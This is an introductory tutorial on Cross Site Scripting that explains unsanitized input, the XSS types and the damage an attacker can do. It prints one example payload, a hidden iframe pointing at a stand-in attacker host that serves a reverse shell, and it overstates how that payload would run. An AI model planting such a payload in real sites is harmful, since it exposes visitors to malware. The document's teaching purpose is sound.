# Cross Site Scripting (XSS)

##Video


## The Problem
Let's think for a moment: what are websites really made out of?

A website cannot be understood and displayed by a computer unless it is written in a very specific manner. You are probably familiar with **Hypertext Markup Language (HTML)** if you've spent some time on the internet. This is the classic markup language meant to make plain text files into things that can be displayed by a web server. **HTML** is responsible for most (but not all) web based things that you've ever seen in a web browser!

When you want to see memes of cats doing funny things on the internet, HTML is the language that translates a static page of text into images, headings, buttons, links, and more! 

And most of the time, this is totally fine. You, the **client**, browse to the IP address of the web server. The web server sees a visitor and says "I must render the text documents in my main directory so our visitor can see our website!" And the server takes the HTML file and makes it into something that looks good in a web browser. Science, baby!

## The Exploit
Most problems in cyber security can be boiled down to the fact that computers, for better or worse, do exactly what you tell them to do.

If the internet was just a bunch of pictures of static cat memes, I think we'd all be better off and nothing bad would ever happen. The problem here is that people love to make websites... well... **useful**. So maybe instead of cat memes, your company website has a form that take user input and produce some kind of output based on the user input.

Remember, **computers do exactly what you tell them to do**. So what if, instead of just filling out the form like a law-abiding citizen, you decide to put some HTML (or Javascript, or other type of website language) in the form instead?

Ladies and gentlemen, you have Cross Site Scripting: an exploit of **client-side HTML rendering**. The HTML code that you enter into the form is rendered by the website **as if it were part of the website in the first place**.

If a website accepts input from clients and  **does not validate and sanitize its input**, it may be vulnerable to Cross Site Scripting. Speaking simply, the website must be coded to accept input and **treat it as plain text, not HTML** to avoid this problem.

## The Types
There are three types of XSS:
- Reflected XSS: XSS that returns user input 
- Stored XSS: Think of this as XSS that is added to the actual code on the server. This means that anyone who visits a particular page with this kind of XSS will be exploited by it, and it will remain on the server until someone does something about it. Scary stuff.
- DOM Based XSS


## The Damage
XSS is not just a matter of popping up an alert on a website. An atacker can do serious damage if a webpage is vulnerable to XSS.

Consider the following example of an XSS payload:

`<iframe SRC="http://evil.website.evil/reverseShell.exe" height = "0" width = "0"></iframe>`

Here, the `iframe` HTML tag is used to make an embedded inline frame. This frame ends up looking like a tiny little square on the page when it is rendered in the browser. And as soon as a client visits a page that has been infected with an embedded iframe, their browser will try to access and browse to the iframe's source which, in this example, is `evil.website.evil/reverseShell.exe`. So everyone who visits the page while this XSS payload exists will download and launch a reverse shell program.

Yikes!



